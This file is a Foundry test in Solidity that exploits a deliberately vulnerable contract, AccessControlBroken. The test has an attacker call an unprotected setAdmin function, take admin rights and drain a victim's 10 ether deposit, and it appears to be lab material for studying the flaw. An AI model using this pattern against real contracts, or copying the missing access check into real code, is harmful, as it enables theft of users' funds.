// SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

import {AccessControlBroken} from "../../src/vulnerable/AccessControlBroken.sol";

contract Test_AccessControlBroken is Test {
    AccessControlBroken target;

    address victim = address(0xB0B);
    address attacker = address(0xBAD);

    function setUp() public {
        target = new AccessControlBroken();
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 1 ether);

        vm.prank(victim);
        target.deposit{value: 10 ether}();
        assertEq(address(target).balance, 10 ether);
    }

    function testAttackerBecomesAdminAndDrains() public {
        vm.prank(attacker);
        target.setAdmin(attacker);

        assertEq(target.admin(), attacker);

        uint256 attackerStart = attacker.balance;
        vm.prank(attacker);
        target.withdrawAll(payable(attacker));

        assertEq(attacker.balance, attackerStart + 10 ether);
        assertEq(address(target).balance, 0);
    }
}
